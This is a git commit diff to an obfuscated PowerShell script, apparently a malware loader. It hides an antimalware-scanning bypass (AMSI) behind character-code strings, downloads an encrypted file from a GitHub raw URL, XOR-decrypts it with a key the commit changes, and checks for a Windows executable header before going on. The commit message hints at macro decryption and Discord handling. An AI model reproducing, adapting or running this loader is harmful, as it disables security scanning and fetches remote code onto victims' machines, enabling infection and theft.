3072438fc220f60d32d2e0b4790a5351b01024e0
kai195102 <kai195102@users.noreply.github.com>
2026-06-05 20:20:29 -0400

    Fix HTTPS flag, O macro decryption, getenv null crash, Discord validation

--- c.ps1
+++ c.ps1
@@ -1,7 +1,7 @@
 try{$a=[Ref].Assembly.GetType(-join([char[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)));if($a){$b=$a.GetField(-join([char[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100)),40);if($b){$b.SetValue($null,$true)}}}catch{}
 try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12}catch{}
 try{
-  $k=@(0xA6,0x01,0xE6,0x73)
+  $k=@(0x3A,0x97,0x79,0xB0)
   $b=(New-Object Net.WebClient).DownloadData('https://raw.githubusercontent.com/kai195102/d/refs/heads/main/c2d.enc')
   for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i]-bxor$k[$i%4]}
   if($b[0]-ne77-or$b[1]-ne90){exit}
